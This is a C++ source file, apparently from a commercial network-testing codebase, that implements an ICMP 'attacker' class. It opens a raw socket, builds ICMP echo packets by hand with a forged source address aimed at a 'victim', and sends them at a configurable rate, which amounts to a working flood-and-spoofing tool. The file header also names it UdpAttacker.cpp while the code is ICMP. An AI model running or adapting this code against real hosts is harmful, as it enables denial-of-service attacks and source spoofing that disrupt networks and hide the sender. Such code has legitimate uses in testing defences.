////////////////////////////////////////////////////////////////////////////
//
// Copyright (C) 2005
// Packet Engineering, Inc. All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification is not permitted unless authorized in writing by a duly
// appointed officer of Packet Engineering, Inc. or its derivatives
//
// File Name: UdpAttacker.cpp
// Description:
//   
//
// Modification History:
// 
////////////////////////////////////////////////////////////////////////////


#include "AttackMgr/IcmpAttacker.h"

#include <signal.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

AosIcmpAttacker::AosIcmpAttacker()
{
	mProtocol = eSyn;
}

AosIcmpAttacker::AosIcmpAttacker(const OmnIpAddr &sip,
							   const int &sport,
							   const OmnIpAddr &dip,
							   const int &dport,
							   const int &num,
							   const int &interval)
{
	mProtocol = eIcmp;
	mSrcIP = sip;	
	mSrcPort = sport;	
	mDstIP = dip;	
	mDstPort = dport;	
	mNumPerSecond = num;// per second
	mCalcIntevel = interval;//ms
	mTimerSec = interval /1000;
	mTimerUSec = interval %1000 *1000;
}

AosIcmpAttacker::~AosIcmpAttacker()
{
}

bool		
AosIcmpAttacker::bind()
{
	mRawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt (mRawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
	return true;
}

bool		
AosIcmpAttacker::unbind()
{
	return true;
}

bool		
AosIcmpAttacker::sendPacket()
{
	u_long victim = mSrcIP.toInt();
	u_long source = mDstIP.toInt();

	int tmplen;
	struct sockaddr_in sin;
	struct iphdr *ih;
	struct icmphdr *icmp;
	char *packet;
	int pktsize = sizeof (struct iphdr) + sizeof (struct icmphdr) + 64;
	
	srandom ((time (NULL) + random ()));
	packet = (char *) malloc (pktsize);
	ih = (struct iphdr *) packet;
	icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
	memset (packet, 0, pktsize);
	
	ih->version = 4;
	ih->ihl = 5;
	ih->tos = 0x00;
	ih->tot_len = htons(pktsize);
	ih->id = htons (getpid());
	ih->frag_off = 0;
	ih->ttl = 255;
	ih->protocol = IPPROTO_ICMP;
	ih->check = 0;
	//ih->saddr = k00lip ();
	ih->saddr = source;
	ih->daddr = victim;
	icmp->type = ICMP_ECHO;
	icmp->code = 0;
	icmp->checksum = htons(~(ICMP_ECHO << 8));
	
	sin.sin_addr.s_addr = ih->saddr;
//	printf("From the source %s , ", inet_ntoa(sin.sin_addr));
	
	sin.sin_family = AF_INET;
	sin.sin_port = htons(0);
	sin.sin_addr.s_addr = ih->daddr;
	tmplen = sendto (mRawsock, packet, pktsize, 0, (sockaddr *)&sin, sizeof (sin));
	free(packet);
//	printf("Send the ICMP to victim %s , the content len=%d\n", inet_ntoa(sin.sin_addr), tmplen);
	return true;
}

